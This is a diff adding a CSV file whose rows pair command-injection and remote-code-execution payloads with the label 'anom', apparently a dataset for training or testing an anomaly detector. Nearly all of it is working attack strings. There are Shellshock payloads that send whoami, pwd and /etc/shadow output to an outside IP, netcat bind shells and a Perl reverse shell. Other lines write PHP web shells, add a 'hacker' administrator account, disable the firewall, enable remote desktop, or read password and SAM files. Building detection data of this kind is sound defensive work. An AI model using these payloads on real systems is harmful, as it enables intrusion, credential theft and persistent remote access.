@@ -1,0 +1,672 @@
+payload,label
+|| ,anom
+| ,anom
+; ,anom
+',anom
+"'""",anom
+"
+'",anom
+& ,anom
+&& ,anom
+%0a,anom
+%0a%0d,anom
+%0Acat%20/etc/passwd,anom
+%0Aid,anom
+%0a id %0a,anom
+%0Aid%0A,anom
+%0a ping -i 30 127.0.0.1 %0a,anom
+%0A/usr/bin/id,anom
+%0A/usr/bin/id%0A,anom
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",anom
+%20{${phpinfo()}},anom
+%20{${sleep(20)}},anom
+%20{${sleep(3)}},anom
+a|id|,anom
+a;id|,anom
+a;id;,anom
+a;id\n,anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",anom
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",anom
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",anom
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",anom
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",anom
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",anom
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",anom
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",anom
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",anom
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",anom
+cat /etc/hosts,anom
+$(`cat /etc/passwd`),anom
+cat /etc/passwd,anom
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,anom
+| curl http://crowdshield.com/.testing/rce.txt,anom
+& curl http://crowdshield.com/.testing/rce.txt,anom
+; curl https://crowdshield.com/.testing/rce_vuln.txt,anom
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,anom
+curl https://crowdshield.com/.testing/rce_vuln.txt,anom
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",anom
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",anom
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),anom
+dir,anom
+| dir,anom
+; dir,anom
+$(`dir`),anom
+& dir,anom
+&&dir,anom
+&& dir,anom
+| dir C:\,anom
+; dir C:\,anom
+& dir C:\,anom
+&& dir C:\,anom
+dir C:\,anom
+| dir C:\Documents and Settings\*,anom
+; dir C:\Documents and Settings\*,anom
+& dir C:\Documents and Settings\*,anom
+&& dir C:\Documents and Settings\*,anom
+dir C:\Documents and Settings\*,anom
+| dir C:\Users,anom
+; dir C:\Users,anom
+& dir C:\Users,anom
+&& dir C:\Users,anom
+dir C:\Users,anom
+;echo%20'<script>alert(1)</script>',anom
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,anom
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",anom
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",anom
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",anom
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",anom
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
+;echo '<script>alert(1)</script>',anom
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,anom
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,anom
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
+() { :;}; echo vulnerable 10,anom
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),anom
+eval('ls'),anom
+eval('pwd'),anom
+eval('pwd');,anom
+eval('sleep 5'),anom
+eval('sleep 5');,anom
+eval('whoami'),anom
+eval('whoami');,anom
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),anom
+exec('ls'),anom
+exec('pwd'),anom
+exec('pwd');,anom
+exec('sleep 5'),anom
+exec('sleep 5');,anom
+exec('whoami'),anom
+exec('whoami');,anom
+";{$_GET[""cmd""]}",anom
+`id`,anom
+|id,anom
+| id,anom
+;id,anom
+;id|,anom
+;id;,anom
+& id,anom
+&&id,anom
+;id\n,anom
+ifconfig,anom
+| ifconfig,anom
+; ifconfig,anom
+& ifconfig,anom
+&& ifconfig,anom
+/index.html|id|,anom
+ipconfig,anom
+| ipconfig /all,anom
+; ipconfig /all,anom
+& ipconfig /all,anom
+&& ipconfig /all,anom
+ipconfig /all,anom
+ls,anom
+$(`ls`),anom
+| ls -l /,anom
+; ls -l /,anom
+& ls -l /,anom
+&& ls -l /,anom
+ls -l /,anom
+| ls -laR /etc,anom
+; ls -laR /etc,anom
+& ls -laR /etc,anom
+&& ls -laR /etc,anom
+| ls -laR /var/www,anom
+; ls -laR /var/www,anom
+& ls -laR /var/www,anom
+&& ls -laR /var/www,anom
+| ls -l /etc/,anom
+; ls -l /etc/,anom
+& ls -l /etc/,anom
+&& ls -l /etc/,anom
+ls -l /etc/,anom
+ls -lh /etc/,anom
+| ls -l /home/*,anom
+; ls -l /home/*,anom
+& ls -l /home/*,anom
+&& ls -l /home/*,anom
+ls -l /home/*,anom
+*; ls -lhtR /var/www/,anom
+| ls -l /tmp,anom
+; ls -l /tmp,anom
+& ls -l /tmp,anom
+&& ls -l /tmp,anom
+ls -l /tmp,anom
+| ls -l /var/www/*,anom
+; ls -l /var/www/*,anom
+& ls -l /var/www/*,anom
+&& ls -l /var/www/*,anom
+ls -l /var/www/*,anom
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",anom
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",anom
+"<!--#exec cmd=""/usr/bin/id;-->",anom
+\n,anom
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,anom
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,anom
+\n/bin/ls -al\n,anom
+| nc -lvvp 4444 -e /bin/sh|,anom
+; nc -lvvp 4444 -e /bin/sh;,anom
+& nc -lvvp 4444 -e /bin/sh&,anom
+&& nc -lvvp 4444 -e /bin/sh &,anom
+nc -lvvp 4444 -e /bin/sh,anom
+nc -lvvp 4445 -e /bin/sh &,anom
+nc -lvvp 4446 -e /bin/sh|,anom
+nc -lvvp 4447 -e /bin/sh;,anom
+nc -lvvp 4448 -e /bin/sh&,anom
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,anom
+\necho INJECTX\nexit\n\033[2Asleep 5\n,anom
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,anom
+| net localgroup Administrators hacker /ADD,anom
+; net localgroup Administrators hacker /ADD,anom
+& net localgroup Administrators hacker /ADD,anom
+&& net localgroup Administrators hacker /ADD,anom
+net localgroup Administrators hacker /ADD,anom
+| netsh firewall set opmode disable,anom
+; netsh firewall set opmode disable,anom
+& netsh firewall set opmode disable,anom
+&& netsh firewall set opmode disable,anom
+netsh firewall set opmode disable,anom
+netstat,anom
+;netstat -a;,anom
+| netstat -an,anom
+; netstat -an,anom
+& netstat -an,anom
+&& netstat -an,anom
+netstat -an,anom
+| net user hacker Password1 /ADD,anom
+; net user hacker Password1 /ADD,anom
+& net user hacker Password1 /ADD,anom
+&& net user hacker Password1 /ADD,anom
+net user hacker Password1 /ADD,anom
+| net view,anom
+; net view,anom
+& net view,anom
+&& net view,anom
+net view,anom
+\nid|,anom
+\nid;,anom
+\nid\n,anom
+\n/usr/bin/id\n,anom
+"perl -e 'print ""X""x1024'",anom
+"|| perl -e 'print ""X""x16096'",anom
+"| perl -e 'print ""X""x16096'",anom
+"; perl -e 'print ""X""x16096'",anom
+"& perl -e 'print ""X""x16096'",anom
+"&& perl -e 'print ""X""x16096'",anom
+"perl -e 'print ""X""x16384'",anom
+"; perl -e 'print ""X""x2048'",anom
+"& perl -e 'print ""X""x2048'",anom
+"&& perl -e 'print ""X""x2048'",anom
+"perl -e 'print ""X""x2048'",anom
+"|| perl -e 'print ""X""x4096'",anom
+"| perl -e 'print ""X""x4096'",anom
+"; perl -e 'print ""X""x4096'",anom
+"& perl -e 'print ""X""x4096'",anom
+"&& perl -e 'print ""X""x4096'",anom
+"perl -e 'print ""X""x4096'",anom
+"|| perl -e 'print ""X""x8096'",anom
+"| perl -e 'print ""X""x8096'",anom
+"; perl -e 'print ""X""x8096'",anom
+"&& perl -e 'print ""X""x8096'",anom
+"perl -e 'print ""X""x8192'",anom
+"perl -e 'print ""X""x81920'",anom
+|| phpinfo(),anom
+| phpinfo(),anom
+ {${phpinfo()}},anom
+;phpinfo(),anom
+;phpinfo();//,anom
+';phpinfo();//,anom
+{${phpinfo()}},anom
+& phpinfo(),anom
+&& phpinfo(),anom
+phpinfo(),anom
+phpinfo();,anom
+"<?php system(""cat /etc/passwd"");?>",anom
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",anom
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",anom
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",anom
+"<?php system(""sleep 10"");?>",anom
+"<?php system(""sleep 5"");?>",anom
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",anom
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",anom
+:phpversion();,anom
+`ping 127.0.0.1`,anom
+& ping -i 30 127.0.0.1 &,anom
+& ping -n 30 127.0.0.1 &,anom
+;${@print(md5(RCEVulnerable))};,anom
+"${@print(""RCEVulnerable"")}",anom
+${@print(system($_SERVER['HTTP_USER_AGENT']))},anom
+pwd,anom
+| pwd,anom
+; pwd,anom
+& pwd,anom
+&& pwd,anom
+\r,anom
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",anom
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",anom
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",anom
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",anom
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",anom
+\r\n,anom
+route,anom
+| sleep 1,anom
+; sleep 1,anom
+& sleep 1,anom
+&& sleep 1,anom
+sleep 1,anom
+|| sleep 10,anom
+| sleep 10,anom
+; sleep 10,anom
+{${sleep(10)}},anom
+& sleep 10 ,anom
+&& sleep 10,anom
+sleep 10,anom
+|| sleep 15,anom
+| sleep 15,anom
+; sleep 15,anom
+& sleep 15 ,anom
+&& sleep 15,anom
+ {${sleep(20)}},anom
+{${sleep(20)}},anom
+ {${sleep(3)}},anom
+{${sleep(3)}},anom
+| sleep 5,anom
+; sleep 5,anom
+& sleep 5,anom
+&& sleep 5,anom
+sleep 5,anom
+ {${sleep(hexdec(dechex(20)))}} ,anom
+{${sleep(hexdec(dechex(20)))}} ,anom
+sysinfo,anom
+| sysinfo,anom
+; sysinfo,anom
+& sysinfo,anom
+&& sysinfo,anom
+;system('cat%20/etc/passwd'),anom
+system('cat C:\boot.ini');,anom
+system('cat config.php');,anom
+system('cat /etc/passwd');,anom
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,anom
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,anom
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,anom
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,anom
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,anom
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),anom
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),anom
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,anom
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),anom
+systeminfo,anom
+| systeminfo,anom
+; systeminfo,anom
+& systeminfo,anom
+&& systeminfo,anom
+system('ls'),anom
+system('pwd'),anom
+system('pwd');,anom
+|| system('sleep 5');,anom
+| system('sleep 5');,anom
+; system('sleep 5');,anom
+& system('sleep 5');,anom
+&& system('sleep 5');,anom
+system('sleep 5'),anom
+system('sleep 5');,anom
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),anom
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,anom
+system('whoami'),anom
+system('whoami');,anom
+test*; ls -lhtR /var/www/,anom
+"test* || perl -e 'print ""X""x16096'",anom
+"test* | perl -e 'print ""X""x16096'",anom
+"test* & perl -e 'print ""X""x16096'",anom
+"test* && perl -e 'print ""X""x16096'",anom
+"test*; perl -e 'print ""X""x16096'",anom
+$(`type C:\boot.ini`),anom
+&&type C:\\boot.ini,anom
+| type C:\Windows\repair\SAM,anom
+; type C:\Windows\repair\SAM,anom
+& type C:\Windows\repair\SAM,anom
+&& type C:\Windows\repair\SAM,anom
+type C:\Windows\repair\SAM,anom
+| type C:\Windows\repair\SYSTEM,anom
+; type C:\Windows\repair\SYSTEM,anom
+& type C:\Windows\repair\SYSTEM,anom
+&& type C:\Windows\repair\SYSTEM,anom
